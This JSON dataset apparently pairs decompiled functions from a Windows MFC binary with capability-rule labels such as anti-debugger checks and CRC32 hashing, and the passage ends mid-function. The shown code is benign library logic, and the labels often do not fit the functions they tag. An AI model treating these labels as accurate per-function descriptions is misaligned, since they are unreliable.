{
    "004010f0": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004010f0(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00401120();\n    if ((arg_8h & 1) != 0) {\n        fcn.004011a0(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 79
    },
    "004053ff": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004053ff(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    if ((*0x42de08 & 1) == 0) {\n        *0x42de08 = *0x42de08 | 1;\n        fcn.00405900();\n        fcn.00407080(fcn.004054a9);\n    }\n    iVar1 = fcn.00405f10();\n    if (iVar1 != 0) {\n        iVar1 = fcn.00405960();\n        if (iVar1 != 0) {\n            uVar2 = fcn.00405950();\n            fcn.00405eb0(uVar2);\n        }\n        uVar2 = fcn.00405910();\n        *(arg_8h + 0x18) = uVar2;\n        uVar2 = fcn.00405930();\n        *(arg_8h + 0x1c) = uVar2;\n        uVar2 = fcn.00405930();\n        *(arg_8h + 0x24) = uVar2;\n    }\n    fcn.00406410(arg_8h);\n    return;\n}\n",
        "token_count": 275
    },
    "004057e0": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004057e0(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00405810();\n    if ((arg_8h & 1) != 0) {\n        fcn.004011a0(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 79
    },
    "00405830": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405830(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00401140();\n    if ((arg_8h & 1) != 0) {\n        fcn.004011a0(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 78
    },
    "00406430": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.00406430(void)\n\n{\n    if ((*0x430638 & 1) == 0) {\n        *0x430638 = *0x430638 | 1;\n    }\n    return;\n}\n",
        "token_count": 49
    },
    "00406590": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.00406590(void)\n\n{\n    if ((*0x42de3c & 1) == 0) {\n        *0x42de3c = *0x42de3c | 1;\n        fcn.00415acc();\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "004068f0": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004068f0(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.0040668b();\n    if ((arg_8h & 1) != 0) {\n        fcn.00415cc6(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 80
    },
    "0040a3c9": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a3c9(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    char *pcVar1;\n    uint32_t *puVar2;\n    int32_t *piVar3;\n    char cVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    code *pcVar8;\n    uint8_t uVar9;\n    int32_t *piVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar5 = arg_8h[4];\n    iVar6 = *(arg_ch - 4);\n    piVar10 = arg_ch - 4;\n    uVar11 = arg_ch - arg_8h[3] >> 0xf;\n    uVar7 = *(arg_ch - 8);\n    var_ch = iVar6 + -1;\n    piVar3 = uVar11 * 0x204 + 0x144 + uVar5;\n    uVar13 = *(var_ch + piVar10);\n    if ((uVar13 & 1) == 0) {\n        arg_ch = (uVar13 >> 4) - 1;\n        if (0x3f < arg_ch) {\n            arg_ch = 0x3f;\n        }\n        if (*(iVar6 + 3 + piVar10) == *(iVar6 + 7 + piVar10)) {\n            if (arg_ch < 0x20) {\n                pcVar1 = arg_ch + 4 + uVar5;\n                uVar12 = ~(0x80000000U >> (arg_ch & 0x1f));\n                puVar2 = uVar5 + 0x44 + uVar11 * 4;\n                *puVar2 = *puVar2 & uVar12;\n                *pcVar1 = *pcVar1 + -1;\n                if (*pcVar1 == '\\0') {\n                    *arg_8h = *arg_8h & uVar12;\n                }\n            }\n            else {\n                pcVar1 = arg_ch + 4 + uVar5;\n                uVar12 = ~(0x80000000U >> (arg_ch - 0x20 & 0x1f));\n                puVar2 = uVar5 + 0xc4 + uVar11 * 4;\n                *puVar2 = *puVar2 & uVar12;\n                *pcVar1 = *pcVar1 + -1;\n                if (*pcVar1 == '\\0') {\n                    arg_8h[1] = arg_8h[1] & uVar12;\n                }\n            }\n        }\n        *(*(iVar6 + 7 + piVar10) + 4) = *(iVar6 + 3 + piVar10);\n        var_ch = var_ch + uVar13;\n        *(*(iVar6 + 3 + piVar10) + 8) = *(iVar6 + 7 + piVar10);\n    }\n    uVar13 = (var_ch >> 4) - 1;\n    if (0x3f < uVar13) {\n        uVar13 = 0x3f;\n    }\n    if ((uVar7 & 1) == 0) {\n        piVar10 = piVar10 - uVar7;\n        arg_ch = (uVar7 >> 4) - 1;\n        if (0x3f < arg_ch) {\n            arg_ch = 0x3f;\n        }\n        var_ch = var_ch + uVar7;\n        uVar13 = (var_ch >> 4) - 1;\n        if (0x3f < uVar13) {\n            uVar13 = 0x3f;\n        }\n        if (arg_ch != uVar13) {\n            if (piVar10[1] == piVar10[2]) {\n                if (arg_ch < 0x20) {\n                    pcVar1 = arg_ch + 4 + uVar5;\n                    uVar12 = ~(0x80000000U >> (arg_ch & 0x1f));\n                    puVar2 = uVar5 + 0x44 + uVar11 * 4;\n                    *puVar2 = *puVar2 & uVar12;\n                    *pcVar1 = *pcVar1 + -1;\n                    if (*pcVar1 == '\\0') {\n                        *arg_8h = *arg_8h & uVar12;\n                    }\n                }\n                else {\n                    pcVar1 = arg_ch + 4 + uVar5;\n                    uVar12 = ~(0x80000000U >> (arg_ch - 0x20 & 0x1f));\n                    puVar2 = uVar5 + 0xc4 + uVar11 * 4;\n                    *puVar2 = *puVar2 & uVar12;\n                    *pcVar1 = *pcVar1 + -1;\n                    if (*pcVar1 == '\\0') {\n                        arg_8h[1] = arg_8h[1] & uVar12;\n                    }\n                }\n            }\n            *(piVar10[2] + 4) = piVar10[1];\n            *(piVar10[1] + 8) = piVar10[2];\n        }\n    }\n    if (((uVar7 & 1) != 0) || (arg_ch != uVar13)) {\n        piVar10[1] = piVar3[uVar13 * 2 + 1];\n        piVar10[2] = piVar3 + uVar13 * 2;\n        (piVar3 + uVar13 * 2)[1] = piVar10;\n        *(piVar10[1] + 8) = piVar10;\n        if (piVar10[1] == piVar10[2]) {\n            cVar4 = *(uVar13 + 4 + uVar5);\n            *(uVar13 + 4 + uVar5) = cVar4 + '\\x01';\n            uVar9 = uVar13;\n            if (uVar13 < 0x20) {\n                if (cVar4 == '\\0') {\n                    *arg_8h = *arg_8h | 0x80000000U >> (uVar9 & 0x1f);\n                }\n                puVar2 = uVar5 + 0x44 + uVar11 * 4;\n                *puVar2 = *puVar2 | 0x80000000U >> (uVar9 & 0x1f);\n            }\n            else {\n                if (cVar4 == '\\0') {\n                    arg_8h[1] = arg_8h[1] | 0x80000000U >> (uVar9 - 0x20 & 0x1f);\n                }\n                puVar2 = uVar5 + 0xc4 + uVar11 * 4;\n                *puVar2 = *puVar2 | 0x80000000U >> (uVar9 - 0x20 & 0x1f);\n            }\n        }\n    }\n    *piVar10 = var_ch;\n    *(var_ch + -4 + piVar10) = var_ch;\n    *piVar3 = *piVar3 + -1;\n    pcVar8 = _sym.imp.KERNEL32.dll_VirtualFree;\n    uVar5 = *0x431648;\n    puVar2 = *0x431650;\n    if ((*piVar3 == 0) && (uVar5 = uVar11,  puVar2 = arg_8h,  *0x431650 != NULL)) {\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(*0x431648 * 0x8000 + (*0x431650)[3], 0x8000, 0x4000);\n        (*0x431650)[2] = (*0x431650)[2] | 0x80000000U >> (*0x431648 & 0x1f);\n        *((*0x431650)[4] + 0xc4 + *0x431648 * 4) = 0;\n        *((*0x431650)[4] + 0x43) = *((*0x431650)[4] + 0x43) + -1;\n        if (*((*0x431650)[4] + 0x43) == '\\0') {\n            (*0x431650)[1] = (*0x431650)[1] & 0xfffffffe;\n        }\n        puVar2 = arg_8h;\n        if ((*0x431650)[2] == 0xffffffff) {\n            (*pcVar8)((*0x431650)[3], 0, 0x8000);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(*0x43165c, 0, (*0x431650)[4]);\n            fcn.00408520(*0x431650, *0x431650 + 5, (*0x431654 * 0x14 - *0x431650) + -0x14 + *0x431658);\n            *0x431654 = *0x431654 + -1;\n            if (*0x431650 < arg_8h) {\n                arg_8h = arg_8h + -5;\n            }\n            *0x43164c = *0x431658;\n            puVar2 = arg_8h;\n        }\n    }\n    *0x431650 = puVar2;\n    *0x431648 = uVar5;\n    return;\n}\n",
        "token_count": 2135
    },
    "00418ec2": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00418ec2(int32_t *param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    uint32_t *arg_8h;\n    uint32_t uVar2;\n    \n    param_1[1] = param_3;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40);\n    *param_1 = iVar1;\n    if (iVar1 != 0) {\n        arg_8h = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar1);\n        fcn.00407b70(arg_8h, param_3 + 0x40, param_1[1]);\n        if (*(arg_8h + 2) == -1) {\n            uVar2 = arg_8h[3];\n        }\n        else {\n            uVar2 = *arg_8h;\n        }\n        param_1[2] = ~uVar2 >> 6 & 1;\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*param_1);\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 255
    },
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "0040ec60": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0040ec60(uint param_1, uint16_t param_2, uint32_t param_3)\n\n{\n    uint uVar1;\n    \n    uVar1 = (*_sym.imp.GDI32.dll_SetBkColor)(param_1, *((param_3 & 0xffff) * 4 + 0x431a04));\n    if ((param_3 & 2) != 0) {\n        (*_sym.imp.GDI32.dll_ExtTextOutA)(param_1, 0, 0, 2, &stack0xffffffe8, 0, 0, 0);\n    }\n    if ((param_3 & 1) != 0) {\n        (*_sym.imp.GDI32.dll_ExtTextOutA)(param_1, 0, 0, 2, &stack0xffffffe8, 0, 0, 0);\n    }\n    if (param_1 != param_2) {\n        (*_sym.imp.GDI32.dll_SetBkColor)(param_1, *(param_2 * 4 + 0x431a04));\n    }\n    if ((param_3 & 4) != 0) {\n        (*_sym.imp.GDI32.dll_ExtTextOutA)(param_1, 0, 0, 2, &stack0xffffffe8, 0, 0, 0);\n    }\n    if ((param_3 & 8) != 0) {\n        (*_sym.imp.GDI32.dll_ExtTextOutA)(param_1, 0, 0, 2, &stack0xffffffe8, 0, 0, 0);\n    }\n    (*_sym.imp.GDI32.dll_SetBkColor)(param_1, uVar1);\n    return;\n}\n",
        "token_count": 395
    },
    "00410620": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00410620(uint param_1)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uchar *puStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uchar auStack16 [8];\n    int32_t iStack8;\n    \n    puStack32 = &stack0xfffffff0;\n    uStack36 = param_1;\n    uStack40 = 0x410636;\n    (*_sym.imp.USER32.dll_GetWindowRect)();\n    uStack40 = 0xfffffff0;\n    uStack44 = param_1;\n    uStack48 = 0x41063f;\n    uVar3 = (*_sym.imp.USER32.dll_GetWindowLongA)();\n    if (((uVar3 & 0x10000000) != 0) &&\n       ((((iStack8 == 0 || (uVar1 = *(iStack8 + 0x18),  (uVar1 & 0xc0) != 0)) || ((uVar1 & 2) == 0)) ||\n        ((uVar1 & 1) == 0)))) {\n        puStack56 = &stack0xffffffe0;\n        uStack48 = 1;\n        uStack52 = 1;\n        uStack60 = 0x41069e;\n        (*_sym.imp.USER32.dll_InflateRect)();\n        uStack60 = param_1;\n        puStack64 = 0x4106a5;\n        uVar4 = (*_sym.imp.USER32.dll_GetParent)();\n        pcVar2 = _sym.imp.USER32.dll_ScreenToClient;\n        puStack64 = &stack0xffffffd0;\n        (*_sym.imp.USER32.dll_ScreenToClient)(uVar4);\n        (*pcVar2)(uVar4, &stack0xffffffd0);\n        if ((uVar3 & 0x200000) != 0) {\n            puStack56 = puStack56 + 1;\n        }\n        (*_sym.imp.USER32.dll_InvalidateRect)(uVar4, &stack0xffffffc0, 0);\n    }\n    return;\n}\n",
        "token_count": 511
    },
    "00415470": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: hWnd\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nint32_t fcn.00415470(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint noname_1;\n    uint32_t uVar4;\n    int32_t *extraout_ECX;\n    uint unaff_EBX;\n    uint uVar5;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint var_10h;\n    int32_t *noname_4;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint hWnd;\n    uint in_stack_ffffffec;\n    uint var_ch;\n    uint in_stack_fffffff4;\n    uint var_4h;\n    uint noname_13;\n    \n    noname_13 = 0x41547a;\n    fcn.004077f4();\n    *(unaff_EBP + -0x10) = &fcn.00415470::var_20h;\n    *(unaff_EBP + -0x1c) = extraout_ECX;\n    iVar2 = extraout_ECX[0x11];\n    *(unaff_EBP + -0x18) = extraout_ECX[0x12];\n    var_20h = unaff_EDI;\n    var_1ch = unaff_ESI;\n    var_18h = unaff_EBX;\n    iVar1 = fcn.0041ab50();\n    uVar5 = *(iVar1 + 0xc);\n    if (extraout_ECX[0x10] != 0) {\n        iVar2 = fcn.0041ab50();\n        uVar5 = *(iVar2 + 0xc);\n        uVar3 = (*_sym.imp.KERNEL32.dll_FindResourceA)(uVar5, extraout_ECX[0x10], 5);\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar5, uVar3);\n    }\n    if (iVar2 != 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar2);\n        *(unaff_EBP + -0x18) = uVar3;\n    }\n    if (*(unaff_EBP + -0x18) == 0) {\n        iVar2 = -1;\n    }\n    else {\n        uVar3 = fcn.004153f4();\n        *(unaff_EBP + -0x14) = uVar3;\n        fcn.0041667b();\n        *(unaff_EBP + -0x20) = 0;\n        if (*(unaff_EBP + -0x14) != 0) {\n            iVar2 = (*_sym.imp.USER32.dll_IsWindowEnabled)(*(unaff_EBP + -0x14));\n            if (iVar2 != 0) {\n                (*_sym.imp.USER32.dll_EnableWindow)(*(unaff_EBP + -0x14), 0);\n                *(unaff_EBP + -0x20) = 1;\n            }\n        }\n        *(unaff_EBP + -4) = 0;\n        noname_4 = extraout_ECX;\n        fcn.0041662f();\n        uVar3 = *(unaff_EBP + -0x14);\n        noname_1 = fcn.0041617d();\n        iVar2 = fcn.00415181(*(unaff_EBP + -0x18), noname_1, uVar5, uVar3, noname_4, var_20h, var_1ch, var_18h, hWnd, \n                             in_stack_ffffffec, var_ch, in_stack_fffffff4, var_4h, noname_13, unaff_retaddr, param_1, \n                             param_2, param_3, var_10h);\n        if (iVar2 != 0) {\n            if ((*(extraout_ECX + 9) & 0x10) != 0) {\n                uVar5 = 4;\n                uVar4 = fcn.0041874c();\n                if ((uVar4 & 0x100) != 0) {\n                    uVar5 = 5;\n                }\n                fcn.00418183(uVar5);\n            }\n            if (extraout_ECX[7] != 0) {\n                fcn.004187c1(0, 0, 0, 0, 0, 0x97);\n            }\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x20) != 0) {\n            (*_sym.imp.USER32.dll_EnableWindow)(*(unaff_EBP + -0x14), 1);\n        }\n        if (*(unaff_EBP + -0x14) != 0) {\n            iVar2 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n            if (iVar2 == extraout_ECX[7]) {\n                (*_sym.imp.USER32.dll_SetActiveWindow)(*(unaff_EBP + -0x14));\n            }\n        }\n        (**(*extraout_ECX + 0x58))();\n        fcn.0041542e();\n        iVar2 = extraout_ECX[0xb];\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar2;\n}\n",
        "token_count": 1308
    },
    "00418183": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004181db)\n// WARNING: Removing unreachable block (ram,0x004181ea)\n// WARNING: Removing unreachable block (ram,0x004181f0)\n// WARNING: Removing unreachable block (ram,0x00418202)\n// WARNING: Removing unreachable block (ram,0x00418209)\n// WARNING: Removing unreachable block (ram,0x0041820f)\n// WARNING: Removing unreachable block (ram,0x00418215)\n// WARNING: Removing unreachable block (ram,0x00418228)\n// WARNING: Removing unreachable block (ram,0x0041822f)\n// WARNING: Removing unreachable block (ram,0x0041824b)\n\nint32_t __thiscall fcn.00418183(int32_t *param_1, uint8_t param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t unaff_EBX;\n    \n    if ((param_2 & 4) != 0) {\n        fcn.0041874c();\n    }\n    (*_sym.imp.USER32.dll_GetParent)(param_1[7]);\n    param_1[9] = param_1[9] | 0x18;\n    iVar2 = fcn.0041455d();\n    pcVar1 = _sym.imp.USER32.dll_UpdateWindow;\n    while( true ) {\n        piVar3 = fcn.0041455d();\n        iVar4 = (**(*piVar3 + 0x5c))();\n        if (iVar4 == 0) {\n            fcn.0041bb25(0);\n            return -1;\n        }\n        if ((unaff_EBX != 0) && ((*(iVar2 + 0x34) == 0x118 || (*(iVar2 + 0x34) == 0x104)))) {\n            fcn.00418810(1);\n            (*pcVar1)(param_1[7]);\n            unaff_EBX = 0;\n        }\n        iVar4 = (**(*param_1 + 0x70))();\n        if (iVar4 == 0) break;\n        piVar3 = fcn.0041455d();\n        iVar4 = (**(*piVar3 + 100))(iVar2 + 0x30);\n        if (iVar4 != 0) {\n            unaff_EBX = 0;\n        }\n        (*_sym.imp.USER32.dll_PeekMessageA)(iVar2 + 0x30, 0, 0, 0, 0);\n    }\n    param_1[9] = param_1[9] & 0xffffffe7;\n    return param_1[0xb];\n}\n",
        "token_count": 602
    },
    "004183c5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n\nbool __cdecl fcn.004183c5(uint32_t arg_8h)\n\n{\n    uint noname_8;\n    uint noname_11;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint32_t uVar3;\n    uint unaff_EDI;\n    bool bVar4;\n    uint *noname_0;\n    uint32_t var_34h;\n    uint var_30h;\n    uint in_stack_ffffffd0;\n    uint in_stack_ffffffd4;\n    uint var_24h;\n    uint in_stack_ffffffdc;\n    uint var_1ch;\n    uint var_18h;\n    uint in_stack_ffffffe8;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.0041ab50();\n    arg_8h = arg_8h & ~*(var_4h + 0x18);\n    if (arg_8h == 0) {\n        bVar4 = true;\n    }\n    else {\n        uVar3 = 0;\n        fcn.004079b0(&var_34h, 0, 0x28);\n        var_30h = _sym.imp.USER32.dll_DefWindowProcA;\n        iVar1 = fcn.0041ab50();\n        noname_11 = *0x42fdc0;\n        noname_8 = *(iVar1 + 8);\n        noname_0 = 0x8;\n        var_ch = 8;\n        if ((arg_8h & 1) != 0) {\n            noname_0 = &var_34h;\n            var_34h = 0xb;\n            iVar1 = fcn.00416cb9(noname_0, unaff_EDI, unaff_ESI, unaff_EBX, 0xb, var_30h, in_stack_ffffffd0, \n                                 in_stack_ffffffd4, noname_8, in_stack_ffffffdc, *0x42fdc0, var_18h, in_stack_ffffffe8, \n                                 \"AfxWnd42s\", 8, var_8h);\n            if (iVar1 != 0) {\n                uVar3 = 1;\n            }\n        }\n        if ((arg_8h & 0x20) != 0) {\n            var_34h = var_34h | 0x8b;\n            iVar1 = fcn.00416cb9(&var_34h, noname_0, unaff_EDI, unaff_ESI, unaff_EBX, var_34h, var_30h, \n                                 in_stack_ffffffd0, in_stack_ffffffd4, noname_8, in_stack_ffffffdc, noname_11, var_18h, \n                                 in_stack_ffffffe8, \"AfxOleControl42s\", var_ch);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 0x20;\n            }\n        }\n        if ((arg_8h & 2) != 0) {\n            var_34h = 0;\n            iVar1 = fcn.00416cb9(&var_34h, noname_0, unaff_EDI, unaff_ESI, unaff_EBX, 0, var_30h, in_stack_ffffffd0, \n                                 in_stack_ffffffd4, noname_8, in_stack_ffffffdc, noname_11, 0x10, in_stack_ffffffe8, \n                                 \"AfxControlBar42s\", var_ch);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 2;\n            }\n        }\n        if ((arg_8h & 4) != 0) {\n            var_34h = 8;\n            iVar1 = fcn.0041830d(&var_34h, \"AfxMDIFrame42s\", 0x7a01);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 4;\n            }\n        }\n        if ((arg_8h & 8) != 0) {\n            var_34h = 0xb;\n            iVar1 = fcn.0041830d(&var_34h, \"AfxFrameOrView42s\", 0x7a02);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 8;\n            }\n        }\n        if ((arg_8h & 0x10) != 0) {\n            var_8h = 0xff;\n            uVar2 = fcn.0041834e(&var_ch, 0x3fc0);\n            uVar3 = uVar3 | uVar2;\n            arg_8h = arg_8h & 0xffffc03f;\n        }\n        if ((arg_8h & 0x40) != 0) {\n            var_8h = 0x10;\n            uVar2 = fcn.0041834e(&var_ch, 0x40);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x80) != 0) {\n            var_8h = 2;\n            uVar2 = fcn.0041834e(&var_ch, 0x80);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x100) != 0) {\n            var_8h = 8;\n            uVar2 = fcn.0041834e(&var_ch, 0x100);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x200) != 0) {\n            var_8h = 0x20;\n            uVar2 = fcn.0041834e(&var_ch, 0x200);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x400) != 0) {\n            var_8h = 1;\n            uVar2 = fcn.0041834e(&var_ch, 0x400);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x800) != 0) {\n            var_8h = 0x40;\n            uVar2 = fcn.0041834e(&var_ch, 0x800);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x1000) != 0) {\n            var_8h = 4;\n            uVar2 = fcn.0041834e(&var_ch, 0x1000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x2000) != 0) {\n            var_8h = 0x80;\n            uVar2 = fcn.0041834e(&var_ch, 0x2000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x4000) != 0) {\n            var_8h = 0x800;\n            uVar2 = fcn.0041834e(&var_ch, 0x4000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x8000) != 0) {\n            var_8h = 0x400;\n            uVar2 = fcn.0041834e(&var_ch, 0x8000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x10000) != 0) {\n            var_8h = 0x200;\n            uVar2 = fcn.0041834e(&var_ch, 0x10000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x20000) != 0) {\n            var_8h = 0x100;\n            uVar2 = fcn.0041834e(&var_ch, 0x20000);\n            uVar3 = uVar3 | uVar2;\n        }\n        *(var_4h + 0x18) = *(var_4h + 0x18) | uVar3;\n        if ((*(var_4h + 0x18) & 0x3fc0) == 0x3fc0) {\n            uVar3 = uVar3 | 0x10;\n            *(var_4h + 0x18) = *(var_4h + 0x18) | 0x10;\n        }\n        bVar4 = (uVar3 & arg_8h) == arg_8h;\n    }\n    return bVar4;\n}\n",
        "token_count": 2140
    },
    "00418719": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00418719(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    if ((*(param_1 + 0x25) & 1) == 0) {\n        (*_sym.imp.USER32.dll_IsDialogMessageA)(*(param_1 + 0x1c), param_2);\n    }\n    else {\n        iVar1 = fcn.0041ab50();\n        (**(**(iVar1 + 0x1038) + 0x24))(param_1, param_2);\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "0041afe8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041afe8(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    \n    iVar6 = param_1 + 0x1c;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(iVar6);\n    iVar7 = *(param_1 + 4);\n    iVar8 = *(param_1 + 8);\n    if ((iVar7 <= iVar8) || ((*(*(param_1 + 0x10) + iVar8 * 8) & 1) != 0)) {\n        iVar8 = 1;\n        if (1 < iVar7) {\n            puVar3 = *(param_1 + 0x10);\n            do {\n                puVar3 = puVar3 + 8;\n                if ((*puVar3 & 1) == 0) break;\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < iVar7);\n            if (iVar8 < iVar7) goto code_r0x0041b0cd;\n        }\n        iVar7 = iVar7 + 0x20;\n        if (*(param_1 + 0x10) == 0) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x2002, iVar7 * 8);\n        }\n        else {\n            uVar5 = (*_sym.imp.KERNEL32.dll_GlobalHandle)(*(param_1 + 0x10));\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(uVar5);\n            iVar4 = (*_sym.imp.KERNEL32.dll_GlobalReAlloc)(uVar5, iVar7 * 8, 0x2002);\n        }\n        pcVar2 = 